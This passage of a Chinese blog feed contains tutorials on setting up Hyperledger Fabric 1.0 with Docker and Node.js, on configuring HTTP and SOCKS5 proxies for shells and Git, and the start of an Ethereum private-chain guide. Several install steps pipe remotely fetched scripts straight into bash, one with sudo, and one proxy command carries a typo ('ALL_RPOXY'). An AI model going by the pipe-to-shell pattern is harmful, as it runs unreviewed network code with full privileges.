LTS 版本已经从 6.x 升级到了 8.x。（2017.11.9）Ubuntu 仓库默认的 Nodejs 版本太古老，因此强烈推荐使用官网的 package manager 方法安装 Node.js。参考 <a href="https://nodejs.org/en/download/package-manager/" target="_blank" rel="noopener">https://nodejs.org/en/download/package-manager/</a></p><p>总结如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL https://deb.nodesource.com/setup_6.x | sudo -E bash -</span><br><span class="line">$ sudo apt-get install -y nodejs</span><br><span class="line">$ npm version</span><br></pre></td></tr></table></figure><blockquote><p><strong>npm加速</strong></p></blockquote><p>国内使用 npm 非常不稳定，推荐使用淘宝 NPM 镜像加速。<br>推荐使用淘宝定制的 cnpm (gzip 压缩支持) 命令行工具代替默认的 npm：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>以后用到 <code>npm install</code> 命令的地方，直接用 <code>cnpm install</code> 代替即可。</p><p>至此，基本上所需要配置的环境已经安装好了，可以进入下一步，根据你的需要下载所需的 docker 镜像，运行示例。</p><hr><h2 id="0x02-下载-Docker-镜像"><a href="#0x02-下载-Docker-镜像" class="headerlink" title="0x02 下载 Docker 镜像"></a>0x02 下载 Docker 镜像</h2><p>官方文档里提供了 Fabric Samples <a href="https://hyperledger-fabric.readthedocs.io/en/release/samples.html" target="_blank" rel="noopener">https://hyperledger-fabric.readthedocs.io/en/release/samples.html</a><br>该示例的源码在 Github 上 <a href="https://github.com/hyperledger/fabric-samples" target="_blank" rel="noopener">https://github.com/hyperledger/fabric-samples</a></p><p>fabric-samples 项目里包括了我们接下来要演示的 fabcar 链码。这里要用到一个脚本去下载所需 Docker 镜像和所需工具。为了把所需工具下载到 fabric-samples 项目里，需要先把该项目 clone 到本地，再在项目目录里下载并执行脚本。</p><p>把项目 Clone 项目到本地：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/hyperledger/fabric-samples.git</span><br></pre></td></tr></table></figure><p>接下来在项目目录里执行下面命令，会获取 <code>bootstrap-1.0.4.sh</code> 脚本并运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd fabric-samples</span><br><span class="line">$ curl -sSL https://raw.githubusercontent.com/hyperledger/fabric/release/scripts/bootstrap-1.0.4.sh | bash</span><br></pre></td></tr></table></figure><p><code>bootstrap-1.0.4.sh</code> 会下载 1.0.4 版本的 Docker 镜像 <code>peer</code> <code>orderer</code> <code>couchdb</code> <code>ccenv</code> <code>javaenv</code> <code>kafka</code> <code>zookeeper</code> <code>tools</code> 并标记成 <code>latest</code>。同时会下载 <a href="https://nexus.hyperledger.org/content/repositories/releases/org/hyperledger/fabric/hyperledger-fabric/linux-amd64-1.0.4/hyperledger-fabric-linux-amd64-1.0.4.tar.gz" target="_blank" rel="noopener">hyperledger-fabric-linux-amd64-1.0.4.tar.gz</a> 压缩包（工具包），并解压缩到当前的 <code>bin</code> 目录下。<br>脚本运行结束后，可以看到项目目录中多出一个 bin 目录，里有 5 个可执行文件和 2 个脚本：<code>configtxgen</code> <code>configtxlator</code> <code>cryptogen</code> <code>orderer</code> <code>peer</code> <code>get-byfn.sh</code> <code>get-docker-images.sh</code>。这些文件在后续搭建网络、生成配置文件和操作链码的时候会用到。</p><p>Docker 镜像下载完成后应该是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ docker images | grep hyperledger*</span><br><span class="line">hyperledger/fabric-ca          latest              8e691b3509bf        8 days ago          238MB</span><br><span class="line">hyperledger/fabric-ca          x86_64-1.0.4        8e691b3509bf        8 days ago          238MB</span><br><span class="line">hyperledger/fabric-tools       latest              6051774928a6        8 days ago          1.33GB</span><br><span class="line">hyperledger/fabric-tools       x86_64-1.0.4        6051774928a6        8 days ago          1.33GB</span><br><span class="line">hyperledger/fabric-couchdb     latest              cf24b91dfeb1        8 days ago          1.5GB</span><br><span class="line">hyperledger/fabric-couchdb     x86_64-1.0.4        cf24b91dfeb1        8 days ago          1.5GB</span><br><span class="line">hyperledger/fabric-kafka       latest              7a9d6f3c4a7c        8 days ago          1.29GB</span><br><span class="line">hyperledger/fabric-kafka       x86_64-1.0.4        7a9d6f3c4a7c        8 days ago          1.29GB</span><br><span class="line">hyperledger/fabric-zookeeper   latest              53c4a0d95fd4        8 days ago          1.3GB</span><br><span class="line">hyperledger/fabric-zookeeper   x86_64-1.0.4        53c4a0d95fd4        8 days ago          1.3GB</span><br><span class="line">hyperledger/fabric-orderer     latest              b17741e7b036        8 days ago          151MB</span><br><span class="line">hyperledger/fabric-orderer     x86_64-1.0.4        b17741e7b036        8 days ago          151MB</span><br><span class="line">hyperledger/fabric-peer        latest              1ce935adc397        8 days ago          154MB</span><br><span class="line">hyperledger/fabric-peer        x86_64-1.0.4        1ce935adc397        8 days ago          154MB</span><br><span class="line">hyperledger/fabric-javaenv     latest              a517b70135c7        8 days ago          1.41GB</span><br><span class="line">hyperledger/fabric-javaenv     x86_64-1.0.4        a517b70135c7        8 days ago          1.41GB</span><br><span class="line">hyperledger/fabric-ccenv       latest              856061b1fed7        8 days ago          1.28GB</span><br><span class="line">hyperledger/fabric-ccenv       x86_64-1.0.4        856061b1fed7        8 days ago          1.28GB</span><br></pre></td></tr></table></figure><hr><h2 id="0x03-演示-fabcar-Demo"><a href="#0x03-演示-fabcar-Demo" class="headerlink" title="0x03 演示 fabcar Demo"></a>0x03 演示 fabcar Demo</h2><p>参考官方文档的<a href="https://hyperledger-fabric.readthedocs.io/en/release/write_first_app.html" target="_blank" rel="noopener">《构建你的第一个应用》</a>去操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 进入 fabcar 目录</span><br><span class="line">$ cd fabric-samples/fabcar</span><br><span class="line"># 安装依赖，因为用的是 Node.js SDK</span><br><span class="line">$ cnpm install</span><br><span class="line"># 启动 Fabric 网络：1 Peer + 1 orderer + ca + couchdb + cli</span><br><span class="line">$ ./startFabric.sh</span><br></pre></td></tr></table></figure><p>如果前面你的配置没问题，运行 fabcar 目录下的 startFabric.sh 脚本后，就可以启动一个简单的 Fabric 网络了，网络由 <code>1 Peer</code> + <code>1 orderer</code> + <code>ca</code> + <code>couchdb</code> + <code>cli</code> 组成。</p><p>之后，就可以按照官方文档中的步骤，用 <code>node enrollAdmin.js</code> <code>node registerUser.js</code> <code>node invoke.js</code> <code>node query.js</code> 与 fabcar 链码交互了。</p><blockquote><p><strong>疑惑1</strong><br>Fabric 网络是怎么建立起来的？</p></blockquote><p>具体参见 <a href="https://github.com/hyperledger/fabric-samples/blob/release/fabcar/startFabric.sh" target="_blank" rel="noopener">startFabric.sh</a> 脚本，可以看到它启动了 fabric-samples/basic-network 目录下的 <a href="https://github.com/hyperledger/fabric-samples/blob/release/basic-network/start.sh" target="_blank" rel="noopener">start.sh</a>，该脚本里执行了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -f docker-compose.yml up -d ca.example.com orderer.example.com peer0.org1.example.com couchdb</span><br></pre></td></tr></table></figure><p>Fabric 网络就在这个 <a href="https://github.com/hyperledger/fabric-samples/blob/release/basic-network/docker-compose.yml" target="_blank" rel="noopener">docker-compose.yml</a> 中定义好了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CA 容器 - ca.example.com</span><br><span class="line">orderer 容器 - orderer.example.com</span><br><span class="line">peer 容器 - peer0.org1.example.com</span><br><span class="line">couchdb 容器 - couchdb</span><br><span class="line">cli 容器 - cli</span><br></pre></td></tr></table></figure><blockquote><p><strong>疑惑2</strong><br>fabcar 链码放在了哪里？以后我们自己的合约又怎么部署 Fabric 网络上？</p></blockquote><p>作为开发者，我们要通过客户端 —— cli 容器——与 Fabric 网络交互。在部署链码时，会通过 cli 客户端把 cli 中的 fabcar 链码安装到 peer0 上。</p><p>在 fabric-samples 项目里，有一个 <code>chaincode</code> 目录，fabcar 就放在了这个目录下。在定义 Fabric 网络的 <code>basic-network/docker-compose.yml</code> 中，可以看到以下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">services:</span><br><span class="line">    ...</span><br><span class="line">    cli:</span><br><span class="line">        ...</span><br><span class="line">        volumes:</span><br><span class="line">            ...</span><br><span class="line">            - ./../chaincode/:/opt/gopath/src/github.com/</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure><p>cli 容器把项目中的 <code>chaincode</code> 目录映射到了容器的 <code>/opt/gopath/src/github.com/</code> 路径下。我们可以进入 cli 容器验证一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker exec -it cli bash</span><br><span class="line"># ls /opt/gopath/src/github.com/</span><br><span class="line">chaincode_example02  fabcar  hyperledger  marbles02  sacc</span><br></pre></td></tr></table></figure><p>当 fabcar/startFabric.sh 脚本执行到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -e &quot;CORE_PEER_LOCALMSPID=Org1MSP&quot; -e &quot;CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp&quot; cli peer chaincode install -n fabcar -v 1.0 -p github.com/fabcar</span><br></pre></td></tr></table></figure><p>会把 cli 中 <code>$GOPATH</code> 路径下的 <code>github.com/fabcar</code> 链码安装到 Fabric 网络中。</p><p>所以，对于我们自己开发的链码，也可以把链码放到项目的 chaincode 目录下，同时链码目录映射到 cli 容器中。修改 startFabric.sh 中的参数，把我们自己的链码安装和实例化。</p><hr><h2 id="0x04-其他说明"><a href="#0x04-其他说明" class="headerlink" title="0x04 其他说明"></a>0x04 其他说明</h2><p>说到用 Golang 开发链码，推荐 Visual Studio Code 编辑器。它自动推荐合适的扩展，对 Go 的支持很好。不过 VSC 在安装 Go 扩展的时候，因为墙的原因，往往会遇到下面的问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Installing github.com/nsf/gocode SUCCEEDED</span><br><span class="line">Installing github.com/uudashr/gopkgs/cmd/gopkgs SUCCEEDED</span><br><span class="line">Installing github.com/ramya-rao-a/go-outline FAILED</span><br><span class="line">Installing github.com/acroca/go-symbols FAILED</span><br><span class="line">Installing golang.org/x/tools/cmd/guru FAILED</span><br><span class="line">Installing golang.org/x/tools/cmd/gorename FAILED</span><br><span class="line">Installing github.com/fatih/gomodifytags SUCCEEDED</span><br><span class="line">Installing github.com/josharian/impl FAILED</span><br><span class="line">Installing github.com/rogpeppe/godef SUCCEEDED</span><br><span class="line">Installing sourcegraph.com/sqs/goreturns FAILED</span><br><span class="line">Installing github.com/golang/lint/golint FAILED</span><br><span class="line">Installing github.com/cweill/gotests/... FAILED</span><br><span class="line">Installing github.com/derekparker/delve/cmd/dlv SUCCEEDED</span><br></pre></td></tr></table></figure><p>解决办法是，给 go 和 git 设置代理。之所以要给 git 也设置代理，是因为安装 go 扩展用到的 <code>go get</code> 命令会先用 git 去仓库获取。Go 目前只支持 http/https 代理，git 可以设置 http/https 和 SOCKS 代理。代理的设置，可以参考 <a href="https://g2ex.github.io/2017/10/22/windows-linux-git-proxy-cmd" target="_blank" rel="noopener">https://g2ex.github.io/2017/10/22/windows-linux-git-proxy-cmd</a></p><p>简言之，在 Ubuntu 里使用以下命令为当前终端和 git 设置代理，然后手动执行 <code>go get -u -v github.com/ramya-rao-a/go-outline</code> 等命令给 VSC 安装扩展。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 当前终端设置 http/https 代理以供 go get 命令使用</span><br><span class="line">$ export http_proxy=http://127.0.0.1:8118</span><br><span class="line">$ export https_proxy=http://127.0.0.1:8118</span><br><span class="line"></span><br><span class="line"># Git 设置 http/https 代理</span><br><span class="line">git config --global http.proxy http://127.0.0.1:8118</span><br><span class="line">git config --global https.proxy http://127.0.0.1:8118</span><br><span class="line"># 或 Git 设置 SOCKS 代理</span><br><span class="line">git config --global http.proxy socks5://127.0.0.1:1080</span><br><span class="line">git config --global https.proxy socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure><hr><p>以上是我在实际操作中遇到过的一些问题和解决方法。随着 Fabric 和官方文档的更新，本文也会过时，不过还是希望能对学习 Fabric 的朋友们有所帮助。</p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h2&gt;&lt;p&gt;目前 Fabric 1.0 部署还是比较繁琐，环境搭建过程需要安装的和配置的东西较多，而且容易出错。
      
    
    </summary>
    
    
      <category term="Blockchain" scheme="https://g2ex.top/tags/Blockchain/"/>
    
      <category term="Fabric" scheme="https://g2ex.top/tags/Fabric/"/>
    
      <category term="Docker" scheme="https://g2ex.top/tags/Docker/"/>
    
      <category term="Golang" scheme="https://g2ex.top/tags/Golang/"/>
    
      <category term="Nodejs" scheme="https://g2ex.top/tags/Nodejs/"/>
    
  </entry>
  
  <entry>
    <title>Win/Linux 命令行、终端和 Git 代理设置</title>
    <link href="https://g2ex.top/2017/10/22/windows-linux-git-proxy-cmd/"/>
    <id>https://g2ex.top/2017/10/22/windows-linux-git-proxy-cmd/</id>
    <published>2017-10-22T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>本文整理了 Windows 命令行 和 Linux 终端以及 Git 中设置代理的命令。以本地 HTTP/HTTPS 代理 <code>127.0.0.1:8118</code> 和 SOCKS5 代理 <code>127.0.0.1:1080</code> 为例。</p><h2 id="Windows-命令行代理设置"><a href="#Windows-命令行代理设置" class="headerlink" title="Windows 命令行代理设置"></a>Windows 命令行代理设置</h2><p>HTTP 代理设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set http_proxy=http://127.0.0.1:8118</span><br><span class="line">set https_proxy=http://127.0.0.1:8118</span><br></pre></td></tr></table></figure><p>SOCKS5 代理设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set http_proxy=socks5://127.0.0.1:1080</span><br><span class="line">set https_proxy=socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>可以通过 <code>echo %http_proxy%</code> 命令查看是否设置成功。</p><p>取消代理设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set http_proxy=</span><br><span class="line">set https_proxy=</span><br></pre></td></tr></table></figure><h2 id="Linux-终端代理设置"><a href="#Linux-终端代理设置" class="headerlink" title="Linux 终端代理设置"></a>Linux 终端代理设置</h2><h3 id="临时代理设置"><a href="#临时代理设置" class="headerlink" title="临时代理设置"></a>临时代理设置</h3><p>Linux 终端设置 HTTP 代理（只对当前终端有效）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ export http_proxy=http://127.0.0.1:8118</span><br><span class="line">$ export https_proxy=http://127.0.0.1:8118</span><br></pre></td></tr></table></figure><p>Linux 中设置 SOCKS5 代理（只对当前终端有效）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ export http_proxy=socks5://127.0.0.1:1080</span><br><span class="line">$ export https_proxy=socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>设置终端中的 wget、curl 等都走 SOCKS5 代理（只对当前终端有效）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ export ALL_PROXY=socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>Linux 终端中取消代理设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ unset http_proxy</span><br><span class="line">$ unset https_proxy</span><br><span class="line">$ unset ALL_RPOXY</span><br></pre></td></tr></table></figure><h3 id="永久代理设置"><a href="#永久代理设置" class="headerlink" title="永久代理设置"></a>永久代理设置</h3><p>将代理命令写入配置文件 <code>~/.profile</code> 或 <code>~/.bashrc</code> 或 <code>~/.zshrc</code> 中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># HTTP 代理设置</span><br><span class="line">export http_proxy=http://127.0.0.1:8118</span><br><span class="line">export https_proxy=http://127.0.0.1:8118</span><br></pre></td></tr></table></figure><p>或 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># SOCKS5 代理设置</span><br><span class="line">export http_proxy=socks5://127.0.0.1:1080</span><br><span class="line">export https_proxy=socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>或 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 强制终端中的 wget、curl 等都走 SOCKS5 代理</span><br><span class="line">export ALL_PROXY=socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure><h2 id="Git-设置代理"><a href="#Git-设置代理" class="headerlink" title="Git 设置代理"></a>Git 设置代理</h2><p>代理格式 <code>[protocol://][user[:password]@]proxyhost[:port]</code><br>参考 <a href="https://git-scm.com/docs/git-config" target="_blank" rel="noopener">https://git-scm.com/docs/git-config</a></p><p>设置 HTTP 代理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy http://127.0.0.1:8118</span><br><span class="line">git config --global https.proxy http://127.0.0.1:8118</span><br></pre></td></tr></table></figure><p>设置 SOCKS5 代理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy socks5://127.0.0.1:1080</span><br><span class="line">git config --global https.proxy socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>Git 取消代理设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy</span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文整理了 Windows 命令行 和 Linux 终端以及 Git 中设置代理的命令。以本地 HTTP/HTTPS 代理 &lt;code&gt;127.0.0.1:8118&lt;/code&gt; 和 SOCKS5 代理 &lt;code&gt;127.0.0.1:1080&lt;/code&gt; 为例。&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="Proxy" scheme="https://g2ex.top/tags/Proxy/"/>
    
      <category term="Git" scheme="https://g2ex.top/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>以太坊私有链搭建指南</title>
    <link href="https://g2ex.top/2017/09/12/ethereum-guidance/"/>
    <id>https://g2ex.top/2017/09/12/ethereum-guidance/</id>
    <published>2017-09-12T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><h3 id="一、为什么用到私有链？"><a href="#一、为什么用到私有链？" class="headerlink" title="一、为什么用到私有链？"></a>一、为什么用到私有链？</h3><p>在以太坊的共有链上部署智能合约、发起交易需要花费以太币。而通过修改配置，可以在本机搭建一套以太坊私有链，因为与公有链没关系，既不用同步公有链庞大的数据，也不用花钱购买以太币，很好地满足了智能合约开发和测试的要求，开发好的智能合约也可以很容易地切换接口部署到以太坊公有链上。</p><h3 id="二、需要用到哪些工具？"><a href="#二、需要用到哪些工具？" class="headerlink" title="二、需要用到哪些工具？"></a>二、需要用到哪些工具？</h3><ol><li>以太坊客户端<br>以太坊客户端用于接入以太坊网络，进行账户管理、交易、挖矿、智能合约相关的操作。目前有多种语言实现的客户端，常用的有 Go 语言实现的 go-ethereum 客户端 Geth，支持接入以太坊网络并成为一个完整节点，也可作为一个 HTTP-RPC 服务器对外提供 JSON-RPC 接口。<br>其他的客户端有：<ul><li>Parity：Rust 语言实现；</li><li>cpp-ethereum：C++ 语言实现；</li><li>ethereumjs-lib：JavaScript 语言实现；</li><li>Ethereum(J)：Java 语言实现；</li><li>ethereumH：Haskell 语言实现；</li><li>pyethapp： Python 语言实现；</li><li>ruby-ethereum：Ruby 语言实现；</li></ul></li><li>智能合约编译器<br>以太坊支持两种智能合约的编程语言：Solidity 和 Serpent。Serpent 语言面临一些安全问题，现在已经不推荐使用了。Solidity 语法类似 JavaScript，它编译器 solc 可以把智能合约源码编译成以太坊虚拟机 EVM 可以执行的二进制码。<br>现在以太坊提供更方便的在线 IDE —— Remix <a href="https://remix.ethereum.org" target="_blank" rel="noopener">https://remix.ethereum.org</a> 使用 Remix，免去了安装 solc 和编译过程，它可以直接提供部署合约所需的二进制码和 ABI。</li><li>以太坊钱包<br>以太坊提供了图形界面的钱包 Ethereum Wallet 和 Mist Dapp 浏览器。钱包的功能是 Mist 的一个子集，可用于管理账户和交易；Mist 在钱包基础上，还能操作智能合约。为了演示合约部署过程，本文使用了 Geth console 操作，没有用到 Mist，当然，使用 Mist 会更简单。</li></ol><h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><p>这里以 Ubuntu 16.04 为例进行介绍。</p><h3 id="一、安装以太坊客户端"><a href="#一、安装以太坊客户端" class="headerlink" title="一、安装以太坊客户端"></a>一、安装以太坊客户端</h3><p>两种方式可选：PPA 直接安装、源码编译安装。</p><ol><li><p>PPA  直接安装<br>安装必要的工具包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install software-properties-common</span><br></pre></td></tr></table></figure><p>添加以太坊源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add-apt-repository -y ppa:ethereum/ethereum</span><br><span class="line">apt update</span><br></pre></td></tr></table></figure><p>安装 go-ethereum：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install ethereum</span><br></pre></td></tr></table></figure><p>安装完成后，可以使用 <code>geth version</code> 命令查看是否安装成功。</p></li><li><p>源码安装<br>因为 go-ethereum 使用 Go 语言编写，编译源码前需要配置好 Go 环境。</p><p><strong>配置 Go 语言环境</strong><br>参照 <a href="https://golang.org/doc/install" target="_blank" rel="noopener">https://golang.org/doc/install</a><br>简单地，以安装 go 1.9 为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://storage.googleapis.com/golang/go1.9.linux-amd64.tar.gz</span><br><span class="line">tar -C /usr/local -xzf go1.9.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure><p>编辑 <code>/etc/profile</code> 或 <code>$HOME/.profile</code>，在文件最后添加环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/usr/local/go/bin</span><br></pre></td></tr></table></figure><p>编辑 <code>$HOME/profile</code> 或 <code>$HOME/.bashrc</code>，添加 go 工作目录环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export GOPATH=$HOME/gopath</span><br></pre></td></tr></table></figure><p><strong>下载和编译 Geth</strong><br>安装 C 编译器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y build-essential</span><br></pre></td></tr></table></figure><p>下载最新源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ethereum/go-ethereum</span><br></pre></td></tr></table></figure><p>编译安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd go-ethereum</span><br><span class="line">make geth</span><br></pre></td></tr></table></figure><p>安装完成后，可以使用 <code>geth version</code> 命令查看是否安装成功。记得把生成的 geth 加入到系统的环境变量中。</p></li></ol><h3 id="二、安装-Solidity-编译器"><a href="#二、安装-Solidity-编译器" class="headerlink" title="二、安装 Solidity 编译器"></a>二、安装 Solidity 编译器</h3><p>Solidity 编译器也有多种方法安装，参照 <a href="http://solidity.readthedocs.io/en/latest/installing-solidity.html" target="_blank" rel="noopener">http://solidity.readthedocs.io/en/latest/installing-solidity.html</a> 这里介绍最简单快捷的安装方式：PPA 直接安装。</p><ol><li><p>PPA 直接安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add-apt-repository ppa:ethereum/ethereum</span><br><span class="line">apt update</span><br><span class="line">apt install solc</span><br></pre></td></tr></table></figure></li><li><p>官方推荐使用基于浏览器的 IDE 环境：Remix <a href="https://remix.ethereum.org" target="_blank" rel="noopener">https://remix.ethereum.org</a></p></li></ol><h2 id="私有链搭建"><a href="#私有链搭建" class="headerlink" title="私有链搭建"></a>私有链搭建</h2><h3 id="一、配置初始状态"><a href="#一、配置初始状态" class="headerlink" title="一、配置初始状态"></a>一、配置初始状态</h3><p>要运行以太坊私有链，需要定义自己的创世区块，创世区块信息写在一个 JSON 格式的配置文件中。首先将下面的内容保存到一个 JSON 文件中，例如 <code>genesis.json</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;config&quot;: &#123;</span><br><span class="line">    &quot;chainID&quot;: 1024,</span><br><span class="line">    &quot;homesteadBlock&quot;: 0,</span><br><span class="line">    &quot;eip155Block&quot;: 0,</span><br><span class="line">    &quot;eip158Block&quot;: 0</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;alloc&quot;: &#123;&#125;,</span><br><span class="line">  &quot;coinbase&quot;: &quot;0x0000000000000000000000000000000000000000&quot;,</span><br><span class="line">  &quot;difficulty&quot;: &quot;0x400&quot;,</span><br><span class="line">  &quot;extraData&quot;: &quot;0x0&quot;,</span><br><span class="line">  &quot;gasLimit&quot;: &quot;0x2fefd8&quot;,</span><br><span class="line">  &quot;nonce&quot;: &quot;0xdeadbeefdeadbeef&quot;,</span><br><span class="line">  &quot;mixhash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class="line">  &quot;parentHash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class="line">  &quot;timestamp&quot;: &quot;0x00&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>chainID</code> 指定了独立的区块链网络 ID。网络 ID 在连接到其他节点的时候会用到，以太坊公网的网络 ID 